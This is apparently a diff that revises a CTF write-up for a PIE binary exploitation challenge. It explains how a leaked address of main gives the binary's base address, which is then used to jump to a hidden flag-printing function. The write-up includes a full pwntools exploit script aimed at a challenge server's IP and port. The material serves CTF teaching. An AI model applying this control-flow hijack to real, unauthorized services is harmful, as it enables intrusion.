@@ -1,65 +1,57 @@
-```markdown
 # jumPIEng
 
-**Category:** Binary Exploitation  
-**Description:**  
-Harry, a rookie in the realm of CTFs, has been exploring the nuances of Position-Independent Executables (PIE). He’s convinced that once a binary is compiled with PIE, it’s impossible to leak the flag—no matter how much address information is known. Our task is to prove otherwise by hijacking the program flow to a secret flag-printing function.
+**Category:** Binary Exploitation
 
----
+Harry, a rookie in the realm of Capture The Flag competitions, has just begun exploring the intricacies of binary exploitation—specifically the concept of Position-Independent Executables (**PIE**). Convinced that PIE makes the binary unbreakable if any addresses are discovered, Harry challenges us to extract the flag from his program, which only leaks the runtime address of `main`. Let's prove him wrong!
 
-## Challenge Connection
-
-```bash
 nc 34.131.133.224 12346
-```
+---
 
-## Provided File
+## Challenge
 
-- `redirection` (the binary)
+**Provided File:** redirection
+
 
 ---
 
-## Analysis
+## Overview
 
-1. **PIE and Address Leaks**  
-   With **PIE (Position-Independent Executable)**, the binary’s memory addresses are randomized at runtime. However, if any address is leaked—especially that of `main`—we can use it to calculate the **base address** of the binary in memory.
+1. **PIE & Address Leaks**  
+   PIE randomizes the load address of the binary each time it runs. However, if you can obtain **any** function’s runtime address (like `main`), you can compute the program's **base address**.
 
-2. **Leaked Address**  
-   The challenge conveniently prints the **main** function’s address (e.g., `0x11A9`). This is our starting point for computing the **base address**.
+2. **Leveraging the Main Address**  
+   The challenge conveniently prints the runtime address of `main`. By subtracting the known offset of `main` in the ELF file, we can calculate the **base address** where the binary is loaded.
 
-3. **Flag Function**  
-   The binary includes a function named `redirect_to_success`, located at a known offset (e.g., `0x1262`) relative to the binary’s base.
-
-4. **Base Address Calculation**  
-   The **base address** is determined by `leaked_main_address - e.symbols['main']`. Once we have the base, we can add the offset of `redirect_to_success` to jump directly to the function that prints the flag.
+3. **Redirecting Execution**  
+   The binary has a hidden or unreferenced function named `redirect_to_success`. Once we know the base address, we can compute where `redirect_to_success` lives in memory and redirect the program flow to it, thereby triggering the flag-print routine.
 
 ---
 
-## Exploit Steps
+## Steps to Exploit
 
-1. **Receive the Main Address**  
-   - The program outputs the **main** function’s address. Parse that address from the challenge output.
+1. **Receive the Leaked Main Address**  
+   - The remote program prints the address of `main`. Parse this value.
 
-2. **Compute Base Address**  
-   ```python
-   base_address = main_leaked - e.symbols['main']
-   ```
-   - This transforms the leaked runtime address into the loaded base address of the binary.
+2. **Calculate the Base Address**  
+   - Subtract the known offset (ELF symbol) of `main` from the leaked address:
+     ```python
+     base_address = leaked_main - e.symbols['main']
+     ```
 
-3. **Calculate Redirect Function Address**  
-   ```python
-   redirect_address = base_address + e.symbols['redirect_to_success']
-   ```
-   - With the base address known, simply add the `redirect_to_success` offset to find its actual runtime location.
+3. **Compute the Flag Function Address**  
+   - Add the offset of `redirect_to_success` to the base address:
+     ```python
+     redirect_address = base_address + e.symbols['redirect_to_success']
+     ```
 
-4. **Send the New Address**  
-   - Provide the calculated address (`redirect_address`) back to the challenge process, effectively **redirecting** the program flow to the flag-printing function.
+4. **Jump to Flag Function**  
+   - Send the computed address back to the challenge service, causing the program to execute the flag-printing function.
 
 ---
 
-## Full Exploit Script
+## Exploit Script
 
-```
+```python
 from pwn import *
 
 binary = './redirection'
@@ -67,35 +59,21 @@ context.log_level = 'debug'
 context.binary = binary
 
 e = ELF(binary)
-r = remote('34.131.133.224', 12346)  # Connect to challenge server
+r = remote('34.131.133.224', 12346)  # Connect to the challenge server
 
-# Read the leaked address of main
+# Step 1: Receive the main address
 r.recvuntil('Main function address: ')
 main_leaked = r.recvline()
 main_leaked = int(main_leaked, 16)
 
-# Calculate base address
+# Step 2: Calculate base address
 base_address = main_leaked - e.symbols['main']
 log.info(f'Base address: {hex(base_address)}')
 
-# Calculate actual address of the flag function
-redirect_to_abyss = base_address + e.symbols['redirect_to_success']
-log.info(f'Flag function address: {hex(redirect_to_abyss)}')
+# Step 3: Compute the address of the "redirect_to_success" function
+redirect_address = base_address + e.symbols['redirect_to_success']
+log.info(f'Redirect address: {hex(redirect_address)}')
 
-# Send the address to redirect program flow
-r.sendline(hex(redirect_to_abyss))
+# Step 4: Send the address to redirect the program's execution
+r.sendline(hex(redirect_address))
 r.interactive()
-```
-
----
-
-## Conclusion
-
-Despite Harry’s confidence in PIE protection, leaking even a single function’s address (like `main`) allows us to locate and invoke the secret flag function. This demonstrates a typical approach in PIE-enabled binary exploitation:
-
-1. **Leak an address** (e.g., `main`).  
-2. **Calculate** the base address.  
-3. **Redirect** execution to the hidden or otherwise unreferenced function.
-
-By doing so, we successfully **prove Harry wrong** and capture the flag!
-```
